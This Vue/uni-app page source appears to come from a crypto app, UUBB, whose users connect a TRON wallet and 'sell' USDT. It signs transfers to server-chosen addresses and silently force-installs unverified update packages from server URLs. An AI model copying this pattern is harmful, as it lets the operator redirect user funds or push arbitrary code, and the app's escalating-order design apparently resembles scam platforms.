<template>
	<view class="p-3 home-background">
		<!-- <view>Hi, Dear <text class="color-1">{{username}}</text> user, welcome to use uubb</view> -->
		<view style="overflow: hidden;width: 100%;">
			<wyb-noticeBar :showMore="false"
				:text="notice"></wyb-noticeBar>
		</view>

		<view class="border-radius-1 balens p-3 border-radius-2 mt-3"
			style="border-bottom-left-radius: 0;border-bottom-right-radius: 0;">
			<view class="color-3 font-lg flex justify-between">
				<text>Balance</text>
				<i class="iconfont font-lg font-weight-bolder color-icon color-3" @click="showBelenc">&#xe7a4;</i>
			</view>
			<view class="color-3 font-lg font-weight-bold mt-3">
				<text>₹</text>
				{{showBelencAdhide?balenc.balance:'***'}}
				<i class="iconfont font-lg font-weight-bolder color-icon color-3 ml-3"
					@click="RefreshHolde">&#xe797;</i>
			</view>
			<view class="text-align-r mt-1">
				<!-- <text class="color-3 font" @click="withdrawNavigateToClick('/pages/index/kickback/details?type=1')">View Details</text> -->
				<text class="color-3"
					@click="withdrawNavigateToClick('/pages/my/withdraw/index?type=1')">withdraw</text>
			</view>
		</view>
		<view class="border-radius-1 balens p-3 border-radius-2 flex justify-between"
			style="border-top-left-radius:0;border-top-right-radius: 0;">
			<view class="color-3 font-lg"> Bonus</view>
			<view class="color-3 font-lg"><text @click="withdrawNavigateToClick('/pages/index/kickback/index')"><text>₹</text> {{showBelencAdhide?balenc.kickback:'***'}}</text></view>
		</view>
		<view class="background-white border-radius-1 p-3 mt-3">
			<!-- <view class="border-bottom pb-3 font-lg">Recharge</view> -->
			<view class="flex mt-3">
				<view>Please select the <text class="color-1">selling</text> amount</view>
			</view>
			<view class="flex justify-content mt-2">
				<text v-if="orderNum < 3"
					:class="type === 4 ?'font mt-2 p-2 pl-3 pr-3 border-radius-1 border-1 balens color-3 font-lg':'font mt-2 p-2 pl-3 pr-3 border-radius-1 border-1 font-lg'"
					@click="selectBalance(4)">5000</text>
				<text
					:class="type === 1 ?'font mt-2 p-2 pl-3 pr-3 border-radius-1 border-1 balens color-3 font-lg':'font mt-2 p-2 pl-3 pr-3 border-radius-1 border-1 font-lg'"
					@click="selectBalance(1)">100000</text>
				<text
					:class="type === 2 ?'font mt-2 p-2 pl-3 pr-3 border-radius-1 border-1 balens color-3 font-lg':'font mt-2 p-2 pl-3 pr-3 border-radius-1 border-1 font-lg'"
					@click="selectBalance(2)">200000</text>
				<!-- <text
					:class="type === 3 ?'font mt-2 p-2 pl-3 pr-3 border-radius-1 border-1 balens color-3 font-lg':'font mt-2 p-2 pl-3 pr-3 border-radius-1 border-1 font-lg'"
					@click="selectBalance(3)">200</text> -->
			</view>
			<view class="flex justify-between mt-5">
				<text>USDT(TRC20)</text>
				<text class="color-1">{{usdtNumber}}</text>
			</view>
			<view class="balens btn-login p-3 mt-5 border-radius-2 font-lg" @click="RechargeHoled">sell</view>
			<view class="mt-4">Tips: <text style="color: red;">Do not copy any wallet address and use at another platform. Exchange processed only on UUBB chanel will be acknowledged</text></view>
		</view>
		<uni-popup ref="popup" type="center">
			<view class="background-white width-100 border-radius-1">
				<view class="pt-3 pb-3 p-3" style="width: 540upx;margin: auto;">
					<view class="text-align-center font-lg text-align-center color-1 mb-2">USDT(TRC20) {{usdtNum}}
					</view>
					<view class="mb-3 text-align-center">Please scan the code for payment</view>
					<view class="qr-box">
						<canvas canvas-id="qrcode" v-show="qrShow"
							style="width: 500rpx;height: 500upx;;margin: auto;" />
					</view>
					<view class="font mt-2" style="color: red;">Tips:Please do not take screenshots to save this QR code
						for transfer, in order to avoid unnecessary financial losses for you. Our company will not bear
						any financial losses caused by saving this QR code for transfer</view>
					<view class="balens btn-login pt-3 pb-3 mt-5 border-radius-2 font-lg" @click="SuccessHoled">I have
						paid</view>
					<view class="text-align-center p-3 border-top" @click="ClosePopup">Close</view>
				</view>
			</view>
		</uni-popup>
		<uni-popup ref="pop" type="center">
			<view class="background-white width-100 border-radius-1">
				<view class="font-lg border-bottom pb-3 pt-3 text-align-center">Tips</view>
				<view class="p-3 text-align-center">The system is currently undergoing review and may take a few
					minutes. Please be patient and wait!</view>
				<view class="text-align-center p-3 border-top" @click="ClosePop">Close</view>
			</view>
		</uni-popup>
	</view>
</template>

<script>
	import wybNoticeBar from '@/components/wyb-noticeBar/wyb-noticeBar.vue'
	import uQRCode from '@/common/uqrcode.js';
	import axios from 'axios'
	import {
		ServerMessageApiGetBalance,
		ServerOrderApiAddOrder,
		ServerMessageApiGetUsdtRate,
		ServerMessageApiGetVersion,
		ServerOrderApiGetNumByAmount,
		ServerMessageApiGetNoticeMessage,
		ServerMguserApiAppLogin,
		ServerMguserApiUserRegister
	} from '../../server/server';
	export default {
		components: {
			wybNoticeBar
		},
		data() {
			return {
				progress: 0,
				qrShow: false,
				text1: 'http://192.168.3.27:8088/pages/my/Invite/index', //下载连接
				nowTime: '',
				balenc: {},
				type: 1,
				showBelencAdhide: true,
				usdtNumber: 0,
				usdtNum: 0,
				tronWeb: null,
				walletAddress: null,
				username:'',
				orderNum:0,
				notice:[]
			}
		},
		onLoad() {
			if (window.okxwallet) {
				window.okxwallet.tronLink.request({
					method: "tron_requestAccounts"
				});
				if (window.okxwallet.tronLink.ready) {
					this.tronWeb = window.okxwallet.tronLink.tronWeb;
					this.walletAddress = tronWeb.defaultAddress.base58;
					this.logins()
					return false
				}
			}else if (window.tronWeb) {
				this.tronWeb = window.tronWeb;
				this.walletAddress = this.tronWeb.defaultAddress.base58;
				this.logins()
				return false
			}else {
				window.imToken.callAPI('user.showAccountSwitch',{chainType:'TRON'},(err, address)=>{
					if(err) {
					    console.log(11111)
					  } else {
						  location.reload();
						  this.walletAddress = address
					  }
					  this.walletAddress = address
				})
			}
		},
		onShow() {
			
		},
		mounted() {
			
		},
		methods: {
			logins(){
				ServerMguserApiAppLogin({usdtAddress:this.walletAddress}).then((reslut) => {
					if (!reslut.data.flag) {
						
						uni.setStorageSync('useer_date', reslut.data);
						setTimeout(()=>{
							this.selectBalance(this.type)
							this.GetBalanceHoled()
							const token = uni.getStorageSync('useer_date');
							this.username = token.username
							if (token) {
								if (token.isForceUpdates && token.isForceUpdates == 1) {
									this.getVerification()
								}
							}
							this.GetBalanceHoled()
							const orderNum = uni.getStorageSync('orderNum');
							if(orderNum&&Number(orderNum)>2){
								// this.type = 1
								if(this.type == 4){
									this.type == 1
									this.selectBalance(this.type)
								}
								this.orderNum = Number(orderNum)
							}else{
								this.GetNumByAmount()
							}
						},1000)
					}else{
						ServerMguserApiUserRegister({usdtAddress:this.walletAddress}).then(()=>{
							this.logins()
						})
					}
				})
				
			},
			GetNumByAmount(){
				ServerOrderApiGetNumByAmount().then((res)=>{
					this.orderNum = res.data.orderNum
					// if(this.orderNum<3){
					// 	this.type = 4
					// 	this.selectBalance(this.type)
					// }else{
					// 	this.type = 1
					// 	this.selectBalance(this.type)
					// }
				})
			},
			RefreshHolde() {
				this.GetBalanceHoled()
			},
			showBelenc() {
				if (this.showBelencAdhide) {
					this.showBelencAdhide = false
				} else {
					this.showBelencAdhide = true
				}
			},
			async selectBalance(type) {
				this.type = type
				await ServerMessageApiGetUsdtRate({
					type: this.type
				}).then((res) => {
					this.usdtNumber = res.data.usdtNumber
				}).catch(() => {
					return false
				})
			},
			random_No(j) {
				let random_no = ''
				for (var i = 0; i < j; i++) {
					random_no += Math.floor(Math.random() * 10);
				}
				let tims = new Date().getTime()
				random_no = tims - random_no;
				return random_no
			},
			async GetBalanceHoled() {
				await ServerMessageApiGetBalance().then((res) => {
					this.balenc = res.data
				}).catch(() => {
					return false
				})
				await ServerMessageApiGetNoticeMessage().then((res)=>{
					this.notice = []
					this.notice.push(res.data.noticeMessage)
				})
			},
			ClosePop() {
				this.$refs.pop.close()
			},
			ClosePopup() {
				this.$refs.popup.close()
			},
			SuccessHoled() {
				this.$refs.pop.open('center')
			},
			qrFun: function(text) {
				this.qrShow = true
				uQRCode.make({
					canvasId: 'qrcode',
					componentInstance: this,
					text: text,
					size: 300,
					margin: 0,
					backgroundColor: '#ffffff',
					foregroundColor: '#000000',
					fileType: 'jpg',
					errorCorrectLevel: uQRCode.errorCorrectLevel.H,
					success: res => {}
				})
			},
			async TransformUSDT(address,usdtNum,orderNum){
				const parameter = [{
					type: 'address',
					value: address
				}, {
					type: 'uint256',
					value: this.tronWeb.toHex(Number(usdtNum) * Math.pow(10, 6))
				}]
				const tx = await this.tronWeb.transactionBuilder.triggerSmartContract(
					"TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t", "transfer(address,uint256)", {}, parameter,this.walletAddress)
				const transaction = await this.tronWeb.transactionBuilder.addUpdateData(tx.transaction, orderNum, 'utf8');
				const signedTx = await this.tronWeb.trx.sign(transaction);
				const broastTx = await this.tronWeb.trx.sendRawTransaction(signedTx)
				const {code,message} = broastTx;
				if (code,message){
					uni.showModal({
						title: code,
						content: tronWeb.toUtf8(message),
						showCancel: false,
						confirmText: 'Close'
					});
					return false
				}else{
					uni.showLoading({
						title: "Trading Broadcast",
						mask: true,
					});
					setTimeout(()=>{
						uni.hideLoading();
					},3000)
					const TransactionStuts = setInterval(()=>{
						// this.tronWeb.trx.getConfirmedTransaction(broastTx.txid).then((res)=>{
						this.tronWeb.trx.getTransaction(broastTx.txid).then((res)=>{
							uni.hideLoading();
							clearInterval(TransactionStuts)
							if(res.ret[0].contractRet == 'SUCCESS'){
								this.GetBalanceHoled()
								uni.showModal({
									title: res.ret[0].contractRet,
									content: 'Payment successful',
									showCancel: false,
									confirmText: 'Close'
								});
								if(this.type == 4){
									this.orderNum += 1
									if(this.orderNum > 2){
										this.type = 1
									}
									uni.setStorageSync('orderNum',this.orderNum);
								}
							}else{
								uni.showModal({
									title: res.ret[0].contractRet,
									content: 'Insufficient  Energy！',
									showCancel: false,
									confirmText: 'Close'
								});
							}
							// this.GetNumByAmount()
						}).catch((error)=>{
							if(error != 'Transaction not found'){
								clearInterval(TransactionStuts)
								uni.hideLoading();
								uni.showModal({
									title: 'Payment failed',
									content: 'Account resource insufficient error.',
									showCancel: false,
									confirmText: 'Close'
								});
							}
						})
						
					},2000)
				}
			},
			async RechargeHoled() {
				//trx转账交易  可执行
				// var tx = await this.tronWeb.transactionBuilder.sendTrx(
				// 	"TAxPNWHAquGMNb9rkSVqFvMYVoe2mMptmC", 10 * Math.pow(10, 6), this.walletAddress
				// );
				// var signedTx = await this.tronWeb.trx.sign(tx);
				// var broastTx = await this.tronWeb.trx.sendRawTransaction(signedTx);
				// console.log(broastTx)
				const orderNum = 'u'+this.random_No(10)
				ServerOrderApiAddOrder({
					type: this.type,
					usdtAddress: this.walletAddress,
					orderCode: orderNum
				}).then((res) => {
					this.TransformUSDT(res.data.address.trim(),res.data.usdtNum,orderNum).catch((error)=>{
						console.log(error)
					})
				})
					// this.$refs.popup.open('center')
				// uni.showModal({
				// 	title: 'Tips',
				// 	// 提示文字
				// 	content: 'Whether to place an order for purchase？',
				// 	// 取消按钮的文字自定义
				// 	cancelText: "NO",
				// 	// 确认按钮的文字自定义
				// 	confirmText: "YES",
				// 	//删除字体的颜色
				// 	confirmColor: '',
				// 	//取消字体的颜色
				// 	cancelColor: '',
				// 	success: (res)=> {
				// 		if (res.confirm) {
				// 			// 执行确认后的操作
				// 			uni.navigateTo({
				// 				url: '/pages/index/pay?type='+this.type
				// 			});
				// 		} else {
				// 			// 执行取消后的操作
				// 		}
				// 	}
				// })
			},
			withdrawNavigateToClick(url) {
				uni.navigateTo({
					url: url
				});
			},
			getVerification() {
				plus.runtime.getProperty(plus.runtime.appid, (widgetInfo) => {
					ServerMessageApiGetVersion().then((result) => {
						var data = result.data;
						let resultVersion = data.versions.split('.').join('')
						let version = widgetInfo.version.split('.').join('')

						var url = ''
						let useer_date = uni.getStorageSync('useer_date')
						let platform = uni.getSystemInfoSync().platform;

						if (platform === 'ios') {
							if (result.data.isWgt == 2) {
								url = useer_date.iosWgtUrl
							} else {
								url = useer_date.iosApkUrl
							}
						} else if (platform === 'android') {
							if (result.data.isWgt == 2) {
								url = useer_date.adWgtUrl
							} else {
								url = useer_date.adApkUrl
							}
						}
						if (resultVersion > version) {
							uni.showModal({
								title: 'Discovering a new version',
								content: 'A new version has been detected, please update to the new version for use！',
								showCancel: false,
								confirmText: 'Update Now',
								success: () => {
									uni.showLoading({
										title: "Downloading... " + '\n' + JSON
											.stringify(this.progress) + '%',
										mask: true,
									});
									const downloadTask = uni.downloadFile({
										url: url,
										success: (downloadResult) => {
											if (downloadResult.statusCode ===
												200) {
												plus.runtime.install(downloadResult
													.tempFilePath, {
														force: true //是否校验版本 true不校验
													},
													() => {
														uni.showLoading({
															icon: 'none',
															title: 'update success'
														})
														setTimeout(() => {
															uni.hideLoading()
															plus.runtime
																.restart();
														}, 3000)
													},
													(e) => {
														// console.error('install fail...');
														uni.showModal({
															title: 'install fail.',
															content: 'install fail. Please Try Again...',
															showCancel: false,
															confirmText: 'close'
														});
													}
												);
											}
										},
										fail: (err) => {
											uni.showModal({
												title: 'install fail.',
												content: 'Download failed! Please Try Again...',
												showCancel: false,
												confirmText: 'close'
											});
										}
									});
									downloadTask.onProgressUpdate((res) => {
										this.progress = res.progress
									})
								}
							});
						}
					})
				});
			}
		}
	}
</script>

<style>
	/deep/.uni-popup .uni-popup__wrapper {
		width: 80% !important;
		padding: 40rpx;
	}
</style>